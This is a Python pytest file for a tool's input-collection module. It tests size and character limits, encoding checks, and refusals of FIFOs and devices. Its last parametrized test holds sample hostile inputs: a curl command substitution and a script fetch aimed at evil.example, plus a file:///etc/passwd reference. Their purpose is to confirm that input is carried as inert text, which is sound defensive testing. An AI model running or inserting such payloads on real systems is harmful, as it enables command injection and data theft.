"""Exactly one bounded, decodable input source per run — and never a blocking read."""

from __future__ import annotations

import io
import os
from pathlib import Path

import pytest

from sobai.core.errors import SkillError
from sobai.skills.inputs import collect_input, read_file_input
from sobai.skills.models import InputSpec

SPEC = InputSpec(description="material", max_bytes=1024, max_chars=512)
OPTIONAL = InputSpec(description="optional", max_bytes=1024, max_chars=512, required=False)


class FakeStdin:
    """A stdin stand-in that can be a pipe or a terminal."""

    def __init__(self, data: bytes = b"", *, tty: bool = False) -> None:
        self.buffer = io.BytesIO(data)
        self._tty = tty

    def isatty(self) -> bool:
        return self._tty

    def read(self) -> str:  # pragma: no cover - only the buffer path is used
        return self.buffer.getvalue().decode()


@pytest.fixture
def tty_stdin(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("sys.stdin", FakeStdin(tty=True))


def pipe(monkeypatch: pytest.MonkeyPatch, data: bytes) -> None:
    monkeypatch.setattr("sys.stdin", FakeStdin(data, tty=False))


# -- the three sources -----------------------------------------------------
def test_positional_argument(tty_stdin: None) -> None:
    result = collect_input(SPEC, positional="Hello there")
    assert result.source == "argument"
    assert result.text == "Hello there"
    assert result.byte_size == 11
    assert result.digest.startswith("sha256:")


def test_file_input(tmp_path: Path, tty_stdin: None) -> None:
    path = tmp_path / "article.md"
    path.write_text("File content here", encoding="utf-8")
    result = collect_input(SPEC, file=path)
    assert result.source == "file"
    assert result.origin == "article.md"
    assert result.text == "File content here"


def test_file_origin_is_a_basename_not_a_path(tmp_path: Path, tty_stdin: None) -> None:
    """JSON output must not leak the user's directory layout."""
    path = tmp_path / "very" / "private" / "notes.md"
    path.parent.mkdir(parents=True)
    path.write_text("secret plans", encoding="utf-8")
    result = collect_input(SPEC, file=path)
    assert result.origin == "notes.md"
    assert str(tmp_path) not in (result.origin or "")


def test_piped_stdin(monkeypatch: pytest.MonkeyPatch) -> None:
    pipe(monkeypatch, b"Piped article")
    result = collect_input(SPEC)
    assert result.source == "stdin"
    assert result.text == "Piped article"


# -- ambiguity and absence -------------------------------------------------
def test_positional_and_file_together_are_refused(tmp_path: Path, tty_stdin: None) -> None:
    path = tmp_path / "a.md"
    path.write_text("x", encoding="utf-8")
    with pytest.raises(SkillError, match="both given"):
        collect_input(SPEC, positional="text", file=path)


def test_explicit_input_wins_over_a_pipe(monkeypatch: pytest.MonkeyPatch) -> None:
    """stdin is a fallback, so a script's inherited pipe cannot hijack the run."""
    pipe(monkeypatch, b"from the pipe")
    result = collect_input(SPEC, positional="from the argument")
    assert result.source == "argument"
    assert result.text == "from the argument"


def test_no_input_on_a_terminal_fails_immediately(tty_stdin: None) -> None:
    """It must never block waiting for a human to type."""
    with pytest.raises(SkillError, match="no input was supplied"):
        collect_input(SPEC)


def test_empty_pipe_is_reported_not_treated_as_input(monkeypatch: pytest.MonkeyPatch) -> None:
    pipe(monkeypatch, b"   \n  ")
    with pytest.raises(SkillError, match="stdin was empty"):
        collect_input(SPEC)


def test_a_skill_that_needs_no_input_accepts_none(tty_stdin: None) -> None:
    result = collect_input(OPTIONAL)
    assert result.source == "none"
    assert not result.present


def test_a_dash_positional_is_not_treated_as_content(monkeypatch: pytest.MonkeyPatch) -> None:
    pipe(monkeypatch, b"real content")
    result = collect_input(SPEC, positional="-")
    assert result.source == "stdin"


# -- bounds ----------------------------------------------------------------
def test_oversized_file_is_refused_without_reading_it(tmp_path: Path, tty_stdin: None) -> None:
    path = tmp_path / "big.md"
    path.write_bytes(b"x" * (SPEC.max_bytes + 1))
    with pytest.raises(SkillError, match="over this skill's limit"):
        collect_input(SPEC, file=path)


def test_oversized_pipe_is_refused_not_truncated(monkeypatch: pytest.MonkeyPatch) -> None:
    pipe(monkeypatch, b"y" * (SPEC.max_bytes + 1))
    with pytest.raises(SkillError, match="over this skill's limit"):
        collect_input(SPEC)


def test_character_limit_is_enforced_separately_from_bytes(tty_stdin: None) -> None:
    """A multi-byte script can be under the byte cap and over the character cap."""
    spec = InputSpec(max_bytes=4096, max_chars=10)
    with pytest.raises(SkillError, match="characters, over"):
        collect_input(spec, positional="a" * 11)


# -- encoding --------------------------------------------------------------
def test_invalid_utf8_file_is_refused_with_a_fix(tmp_path: Path, tty_stdin: None) -> None:
    path = tmp_path / "latin1.md"
    path.write_bytes("caf\xe9 notes".encode("latin-1"))
    with pytest.raises(SkillError) as excinfo:
        collect_input(SPEC, file=path)
    assert "not valid UTF-8" in excinfo.value.message
    assert "iconv" in (excinfo.value.hint or "")


def test_binary_file_is_refused(tmp_path: Path, tty_stdin: None) -> None:
    path = tmp_path / "image.png"
    path.write_bytes(b"\x89PNG\r\n\x1a\n\x00\x00\x00")
    with pytest.raises(SkillError, match="binary rather than text"):
        collect_input(SPEC, file=path)


def test_bom_is_stripped_from_file_input(tmp_path: Path, tty_stdin: None) -> None:
    path = tmp_path / "bom.md"
    path.write_bytes(b"\xef\xbb\xbfHello")
    assert collect_input(SPEC, file=path).text == "Hello"


# -- unusual paths ---------------------------------------------------------
def test_directory_as_file_is_refused(tmp_path: Path, tty_stdin: None) -> None:
    with pytest.raises(SkillError, match="is a directory"):
        collect_input(SPEC, file=tmp_path)


def test_missing_file_is_refused(tmp_path: Path, tty_stdin: None) -> None:
    with pytest.raises(SkillError, match="cannot read"):
        collect_input(SPEC, file=tmp_path / "absent.md")


def test_fifo_is_refused_rather_than_blocking(tmp_path: Path, tty_stdin: None) -> None:
    fifo = tmp_path / "pipe"
    os.mkfifo(fifo)
    with pytest.raises(SkillError, match="not a regular file"):
        collect_input(SPEC, file=fifo)


def test_character_device_is_refused(tty_stdin: None) -> None:
    """Reading /dev/zero would never finish."""
    with pytest.raises(SkillError, match="not a regular file"):
        read_file_input(Path("/dev/zero"), SPEC)


def test_a_symlinked_input_file_is_allowed(tmp_path: Path, tty_stdin: None) -> None:
    """Input is the user's own data; only *skill* files refuse links."""
    real = tmp_path / "real.md"
    real.write_text("linked content", encoding="utf-8")
    link = tmp_path / "link.md"
    link.symlink_to(real)
    assert collect_input(SPEC, file=link).text == "linked content"


# -- input is inert --------------------------------------------------------
@pytest.mark.parametrize(
    "payload",
    [
        "https://evil.example/steal?data=1",
        "file:///etc/passwd",
        "$(curl https://evil.example)",
        "<script>fetch('https://evil.example')</script>",
    ],
)
def test_urls_and_commands_in_input_are_carried_as_text(payload: str, tty_stdin: None) -> None:
    result = collect_input(SPEC, positional=payload)
    assert result.text == payload


def test_input_content_is_never_part_of_the_description(tty_stdin: None) -> None:
    result = collect_input(SPEC, positional="CANARY-secret-value")
    assert "CANARY" not in result.describe()
